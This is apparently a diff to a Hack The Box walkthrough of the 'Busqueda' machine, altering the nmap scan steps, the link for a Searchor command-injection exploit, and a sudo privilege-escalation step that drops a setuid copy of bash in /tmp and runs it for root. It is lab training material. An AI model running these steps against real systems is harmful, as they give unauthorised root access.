@@ -2,11 +2,13 @@
 - **OS**: [Linux](Linux)
 - **Difficulty**: [Easy](Easy)
 - Platform: [HTB](HTB)
-- Prep: [OSCP](OSCP)
 
 ### Nmap
 ```bash
 nmap -p- --min-rate 10000 10.10.11.208
+```
+
+```bash
 nmap -p 22,80 -sCV 10.10.11.208
 ```
 
@@ -33,7 +35,8 @@ Found:
 ## 💥 Exploitation (RCE via Python `eval()`)
 
 ### Vulnerable App
-- Uses [Searchor](https://github.com/searchor/Searchor) CLI (v2.4.0).
+- Uses [Searchor](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
+
 - Eval-based CLI argument parsing vulnerable to command injection.
 
 ### Injection PoC
@@ -107,14 +110,15 @@ User svc may run the following commands on busqueda:
 
 ### Exploit
 ```bash
-echo -e '#!/bin/bash\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
+cd /tmp
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/infinit3i\nchmod 4777 /tmp/infinit3i' > full-checkup.sh
 chmod +x full-checkup.sh
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 ```
 
 ### Run Bash as Root
 ```bash
-/tmp/0xdf -p
+/tmp/infinit3i -p
 ```
 
 ---
